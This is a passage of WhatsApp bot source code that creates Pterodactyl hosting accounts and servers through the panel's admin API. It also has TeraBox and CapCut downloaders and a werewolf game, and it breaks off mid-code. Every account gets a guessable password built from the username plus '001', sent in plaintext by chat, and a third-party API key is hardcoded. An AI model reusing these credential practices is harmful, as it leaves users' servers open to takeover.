"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `
╭ *𝐇𝐄𝐋𝐋𝐎 @${u.split`@`[0]}*
┃🪀𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄: ${user.username}
┃🪀𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃: ${password}
╰🪀𝐋𝐎𝐆𝐈𝐍:
 ${domain}
╭ *𝐍𝐎𝐓𝐄:*
> 𝐎𝐖𝐍𝐄𝐑 𝐎𝐍𝐋𝐘 𝐒𝐄𝐍𝐃𝐒 𝟏𝐗 𝐃𝐀𝐓𝐀 
> 𝐏𝐋𝐄𝐀𝐒𝐄 𝐒𝐀𝐕𝐄 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓
> 𝐖𝐎𝐍𝐓 𝐑𝐄𝐒𝐄𝐍𝐃 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 
> 𝟏𝟎 𝐃𝐀𝐘𝐒 𝐆𝐔𝐀𝐑𝐀𝐍𝐓𝐄𝐄
╰𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐅𝐀𝐌𝐎𝐔𝐒 𝐃𝐄𝐕 👑`
LordVoltage.sendMessage(u, { caption: ctf, image: fs.readFileSync("./data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_23",
"startup": "if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi;  if [[ ! -z \${CUSTOM_ENVIRONMENT_VARIABLES} ]]; then      vars=\$(echo \${CUSTOM_ENVIRONMENT_VARIABLES} | tr \";\" \"\n\");      for line in \$vars;     do export \$line;     done fi;  /usr/local/bin/\${CMD_RUN};",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
╭ *𝐒𝐄𝐍𝐓 𝐓𝐎 𝐍𝐔𝐌𝐁𝐄𝐑*
┃🪀𝐈𝐃: ${user.id}
┃🪀𝐌𝐄𝐌𝐎𝐑𝐘: ${server.limits.memory === 0 ? '𝐔𝐍𝐋𝐈𝐌𝐈𝐓𝐄𝐃' : server.limits.memory} 
╰ *𝐒𝐇𝐀𝐃Ø𝐖-𝐗𝐌𝐃-𝐕𝟏*
> 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐅𝐀𝐌𝐎𝐔𝐒 𝐃𝐄𝐕 👑
`)
} catch {
  reply('failed,\n_please check your hydroelectric and pltc fires_ Type .tutorial to learn\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴠᴏʟᴛᴀɢᴇ ʟᴏʀᴅ ᴅᴇᴠ')
}
}
}
break
case '8gb': {if (prefix === '.') {
if (!DanzTheCreator && !isPrem) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "8050"
let cpu = "240"
let disk = "8050"
let email = username + "famous@gmail.com"
try {
if (!u) return
let d = (await LordVoltage.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `
╭ *𝐇𝐄𝐋𝐋𝐎 @${u.split`@`[0]}*
┃🪀𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄: ${user.username}
┃🪀𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃: ${password}
╰🪀𝐋𝐎𝐆𝐈𝐍:

 ${domain}

╭ *𝐍𝐎𝐓𝐄:*
> 𝐎𝐖𝐍𝐄𝐑 𝐎𝐍𝐋𝐘 𝐒𝐄𝐍𝐃𝐒 𝟏𝐗 𝐃𝐀𝐓𝐀 
> 𝐏𝐋𝐄𝐀𝐒𝐄 𝐒𝐀𝐕𝐄 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓
> 𝐖𝐎𝐍𝐓 𝐑𝐄𝐒𝐄𝐍𝐃 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 
> 𝟏𝟎 𝐃𝐀𝐘𝐒 𝐆𝐔𝐀𝐑𝐀𝐍𝐓𝐄𝐄
╰𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐅𝐀𝐌𝐎𝐔𝐒 𝐃𝐄𝐕 👑`
LordVoltage.sendMessage(u, { caption: ctf, image: fs.readFileSync("./data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_23",
"startup": "if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi;  if [[ ! -z \${CUSTOM_ENVIRONMENT_VARIABLES} ]]; then      vars=\$(echo \${CUSTOM_ENVIRONMENT_VARIABLES} | tr \";\" \"\n\");      for line in \$vars;     do export \$line;     done fi;  /usr/local/bin/\${CMD_RUN};",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
╭ *𝐒𝐄𝐍𝐓 𝐓𝐎 𝐍𝐔𝐌𝐁𝐄𝐑*
┃🪀𝐈𝐃: ${user.id}
┃🪀𝐌𝐄𝐌𝐎𝐑𝐘: ${server.limits.memory === 0 ? '𝐔𝐍𝐋𝐈𝐌𝐈𝐓𝐄𝐃' : server.limits.memory} 
╰ *𝐒𝐇𝐀𝐃Ø𝐖-𝐗𝐌𝐃-𝐕𝟏*
> 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐅𝐀𝐌𝐎𝐔𝐒 𝐃𝐄𝐕 👑
`)
} catch {
  reply('failed,\n_please check your hydroelectric and pltc fires_ Type .tutorial to learn\n> POWERED BY ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧')
}
}}

break
case '9gb': {if (prefix === '.') {
if (!DanzTheCreator && !isPrem) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "9050"
let cpu = "270"
let disk = "9050"
let email = username + "famous@gmail.com"
try {
if (!u) return
let d = (await LordVoltage.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `
╭ *𝐇𝐄𝐋𝐋𝐎 @${u.split`@`[0]}*
┃🪀𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄: ${user.username}
┃🪀𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃: ${password}
╰🪀𝐋𝐎𝐆𝐈𝐍:
 ${domain}
╭ *𝐍𝐎𝐓𝐄:*
> 𝐎𝐖𝐍𝐄𝐑 𝐎𝐍𝐋𝐘 𝐒𝐄𝐍𝐃𝐒 𝟏𝐗 𝐃𝐀𝐓𝐀 
> 𝐏𝐋𝐄𝐀𝐒𝐄 𝐒𝐀𝐕𝐄 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓
> 𝐖𝐎𝐍𝐓 𝐑𝐄𝐒𝐄𝐍𝐃 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 
> 𝟏𝟎 𝐃𝐀𝐘𝐒 𝐆𝐔𝐀𝐑𝐀𝐍𝐓𝐄𝐄
╰𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐅𝐀𝐌𝐎𝐔𝐒 𝐃𝐄𝐕 👑`
LordVoltage.sendMessage(u, { caption: ctf, image: fs.readFileSync("./data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_23",
"startup": "if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi;  if [[ ! -z \${CUSTOM_ENVIRONMENT_VARIABLES} ]]; then      vars=\$(echo \${CUSTOM_ENVIRONMENT_VARIABLES} | tr \";\" \"\n\");      for line in \$vars;     do export \$line;     done fi;  /usr/local/bin/\${CMD_RUN};",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
╭ *𝐒𝐄𝐍𝐓 𝐓𝐎 𝐍𝐔𝐌𝐁𝐄𝐑*
┃🪀𝐈𝐃: ${user.id}
┃🪀𝐌𝐄𝐌𝐎𝐑𝐘: ${server.limits.memory === 0 ? '𝐔𝐍𝐋𝐈𝐌𝐈𝐓𝐄𝐃' : server.limits.memory} 
╰ *𝐒𝐇𝐀𝐃Ø𝐖-𝐗𝐌𝐃-𝐕𝟏*
> 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐅𝐀𝐌𝐎𝐔𝐒 𝐃𝐄𝐕 👑
`)
} catch {
  reply('failed,\n_please check your hydroelectric and pltc fires_ Type .tutorial to learn\n> POWERED BY ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧')
}
}}

break
case '10gb': {if (prefix === '.') {
if (!DanzTheCreator && !isPrem) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "10050"
let cpu = "300"
let disk = "10050"
let email = username + "famous@gmail.com"
try {
if (!u) return
let d = (await LordVoltage.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `
╭ *𝐇𝐄𝐋𝐋𝐎 @${u.split`@`[0]}*
┃🪀𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄: ${user.username}
┃🪀𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃: ${password}
╰🪀𝐋𝐎𝐆𝐈𝐍:
 ${domain}
╭ *𝐍𝐎𝐓𝐄:*
> 𝐎𝐖𝐍𝐄𝐑 𝐎𝐍𝐋𝐘 𝐒𝐄𝐍𝐃𝐒 𝟏𝐗 𝐃𝐀𝐓𝐀 
> 𝐏𝐋𝐄𝐀𝐒𝐄 𝐒𝐀𝐕𝐄 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓
> 𝐖𝐎𝐍𝐓 𝐑𝐄𝐒𝐄𝐍𝐃 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 
> 𝟏𝟎 𝐃𝐀𝐘𝐒 𝐆𝐔𝐀𝐑𝐀𝐍𝐓𝐄𝐄
╰𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐅𝐀𝐌𝐎𝐔𝐒 𝐃𝐄𝐕 👑`
LordVoltage.sendMessage(u, { caption: ctf, image: fs.readFileSync("./data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_23",
"startup": "if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi;  if [[ ! -z \${CUSTOM_ENVIRONMENT_VARIABLES} ]]; then      vars=\$(echo \${CUSTOM_ENVIRONMENT_VARIABLES} | tr \";\" \"\n\");      for line in \$vars;     do export \$line;     done fi;  /usr/local/bin/\${CMD_RUN};",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
╭ *𝐒𝐄𝐍𝐓 𝐓𝐎 𝐍𝐔𝐌𝐁𝐄𝐑*
┃🪀𝐈𝐃: ${user.id}
┃🪀𝐌𝐄𝐌𝐎𝐑𝐘: ${server.limits.memory === 0 ? '𝐔𝐍𝐋𝐈𝐌𝐈𝐓𝐄𝐃' : server.limits.memory} 
╰ *𝐒𝐇𝐀𝐃Ø𝐖-𝐗𝐌𝐃-𝐕𝟏*
> 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐅𝐀𝐌𝐎𝐔𝐒 𝐃𝐄𝐕 👑
`)
} catch {
  reply('failed,\n_please check your hydroelectric and pltc fires_ Type .tutorial to learn\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴠᴏʟᴛᴀɢᴇ ʟᴏʀᴅ ᴅᴇᴠ')
}
}}

break
case 'unli': {if (prefix === '.') {
if (!DanzTheCreator && !isPrem) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number or use ${prefix + command}2`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "famous@gmail.com"
try {
if (!u) return
let d = (await LordVoltage.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `
╭ *𝐇𝐄𝐋𝐋𝐎 @${u.split`@`[0]}*
┃🪀𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄: ${user.username}
┃🪀𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃: ${password}
╰🪀𝐋𝐎𝐆𝐈𝐍:
 ${domain}
╭ *𝐍𝐎𝐓𝐄:*
> 𝐎𝐖𝐍𝐄𝐑 𝐎𝐍𝐋𝐘 𝐒𝐄𝐍𝐃𝐒 𝟏𝐗 𝐃𝐀𝐓𝐀 
> 𝐏𝐋𝐄𝐀𝐒𝐄 𝐒𝐀𝐕𝐄 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓
> 𝐖𝐎𝐍𝐓 𝐑𝐄𝐒𝐄𝐍𝐃 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 
> 𝟏𝟎 𝐃𝐀𝐘𝐒 𝐆𝐔𝐀𝐑𝐀𝐍𝐓𝐄𝐄
╰𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐅𝐀𝐌𝐎𝐔𝐒 𝐃𝐄𝐕 👑`
LordVoltage.sendMessage(u, { caption: ctf, image: fs.readFileSync("./data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_23",
"startup": "if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi;  if [[ ! -z \${CUSTOM_ENVIRONMENT_VARIABLES} ]]; then      vars=\$(echo \${CUSTOM_ENVIRONMENT_VARIABLES} | tr \";\" \"\n\");      for line in \$vars;     do export \$line;     done fi;  /usr/local/bin/\${CMD_RUN};",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
╭ *𝐒𝐄𝐍𝐓 𝐓𝐎 𝐍𝐔𝐌𝐁𝐄𝐑*
┃🪀𝐈𝐃: ${user.id}
┃🪀𝐌𝐄𝐌𝐎𝐑𝐘: ${server.limits.memory === 0 ? '𝐔𝐍𝐋𝐈𝐌𝐈𝐓𝐄𝐃' : server.limits.memory} 
╰ *𝐒𝐇𝐀𝐃Ø𝐖-𝐗𝐌𝐃-𝐕𝟏*
> 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐅𝐀𝐌𝐎𝐔𝐒 𝐃𝐄𝐕 👑
`)
} catch {
  reply('failed,\n_please check your hydroelectric and pltc fires_ Type .tutorial to learn\n> POWERED BY ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧')
}
}}
break
//==================================================================
case 'hdvid' :
case 'vidhd' : {if (prefix === '.') {
  reply('_The process.... may take quite a long time. Please just wait around 4-8 minutes')
  NanoHDvideo()
}}
break
//==================================================================
case 'terabox':
case 'teraboxdl': {if (prefix === '.') {
  if(!text) return reply('wheres the link?')
reply(mess.wait)
  const response = await fetch(`https://api.alyachan.dev/api/terabox?url=${encodeURIComponent(text)}&apikey=manz.alien`);
const data = await response.json();
const downloadLink = data.data.url;
const caption = data.data.filename;
const responseHeaders = response.headers;
const mimeType = responseHeaders.get('content-type');
LordVoltage.sendMessage(m.chat, { document: { url: downloadLink, mimetype: mimeType }, fileName: caption }, { quoted: m });

}}
break
//==================================================================
case 'capcut':{if (prefix === '.') {
if (!text) return replynano(`Enter link\nExample\nhttps://www.capcut.net/sharevideo?template_id=7239111787965205762 language=en&region=ID`)
await LordVoltage.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try{  
let anu = await fetchJson(`https://itzpire.com/download/capcut?url=${encodeURIComponent(text)}`)
const vidnyabg = anu.data.originalVideoUrl;
const capnya = `_Succes download by ${botname}_\nTitle: ${anu.data.title}`
LordVoltage.sendMessage(m.chat, { video: { url: vidnyabg}, caption: capnya}, {quoted: m})
await LordVoltage.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await LordVoltage.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}}
break 
//==================================================================
case 'ww':
case 'werewolf': {if (prefix === '.') {
let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

let {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    run_pagi
} = require('./lib/werewolf.js')

// [ Thumbnail ] 
let thumb =
    "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";

    const {
        sender,
        chat
    } = m;
    LordVoltage.werewolf = LordVoltage.werewolf ? LordVoltage.werewolf : {};
    const ww = LordVoltage.werewolf ? LordVoltage.werewolf : {};
    const data = ww[chat];
    const value = args[0];
    const target = args[1];

    // [ Membuat Room ]
    if (value === "create") {
        if (chat in ww) return m.reply("The group is still in the game session");
        if (playerOnGame(sender, ww) === true)
            return m.reply("You are still in a game session.");
        ww[chat] = {
            room: chat,
            owner: sender,
            status: false,
            iswin: null,
            cooldown: null,
            day: 0,
            time: "evening",
            player: [],
            dead: [],
            voting: false,
            seer: false,
            guardian: [],
        };
        await m.reply("The room has been successfully created, type *.ww join* to join");

        // [ Join sesi permainan ]
    } else if (value === "join") {
        if (!ww[chat]) return m.reply("There are no gaming sessions yet");
        if (ww[chat].status === true)
            return m.reply("The game session has started");
        if (ww[chat].player.length > 16)
            return m.reply("Sorry, the number of players is full");
        if (playerOnRoom(sender, chat, ww) === true)
            return m.reply("You have joined this room");
        if (playerOnGame(sender, ww) === true)
            return m.reply("You are still in a game session");
        let data = {
            id: sender,
            number: ww[chat].player.length + 1,
            sesi: chat,
            status: false,
            role: false,
            effect: [],
            vote: 0,
            isdead: false,
            isvote: false,
        };
        ww[chat].player.push(data);
        let player = [];
        let text = `\n*⌂ W E R E W O L F - P L A Y E R*\n\n`;
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )}\n`;
            player.push(ww[chat].player[i].id);
        }
        text += "\nThe minimum number of players is 5 and the maximum is 15";
        LordVoltage.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );

        // [ Game Play ]
    } else if (value === "start") {
        if (!ww[chat]) return m.reply("There are no gaming sessions yet");
        if (ww[chat].player.length === 0)
            return m.reply("The room doesn't have any players yet");
        if (ww[chat].player.length < 5)
            return m.reply("Sorry, the number of players does not meet the requirements");
        if (playerOnRoom(sender, chat, ww) === false)
            return m.reply("You haven't joined this room yet");
        if (ww[chat].cooldown > 0) {
            if (ww[chat].time === "voting") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_vote(LordVoltage, chat, ww);
            } else if (ww[chat].time === "ᴇᴠᴇɴɪɴɢ") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_malam(LordVoltage, chat, ww);
            } else if (ww[chat].time === "ᴍᴏʀɴ") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_pagi(LordVoltage, chat, ww);
            }
        }
        if (ww[chat].status === true)
            return m.reply("The game session has started");
        if (ww[chat].owner !== sender)
            return m.reply(
                `only @${ww[chat].owner.split("@")[0]} which can start the game`
            );
        let list1 = "";
        let list2 = "";
        let player = [];
        roleGenerator(chat, ww);
        addTimer(chat, ww);
        startGame(chat, ww);
        for (let i = 0; i < ww[chat].player.length; i++) {
            list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")}\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            list2 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")} ${
          ww[chat].player[i].role === "werewolf" ||
          ww[chat].player[i].role === "sorcerer"
            ? `[${ww[chat].player[i].role}]`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            // [ Werewolf ]
            if (ww[chat].player[i].role === "werewolf") {
                if (ww[chat].player[i].isdead != true) {
                    var textt = `Hello ${LordVoltage.getName(
              ww[chat].player[i].id
            )}, You have been chosen to play a *Werewolf* ${emoji_role(
              "werewolf"
            )} In this game, please choose one of the players you want to eat tonight\n*LIST PLAYER*:\n${list2}\n\nType *.wwpc kill number* to kill the player`;
                    
                    let row = [];
                    for (let p = 0; p < ww[chat].player.length; p++) {
                      row.push({
                        title: `Kill Player ${ww[chat].player[p].number}`,
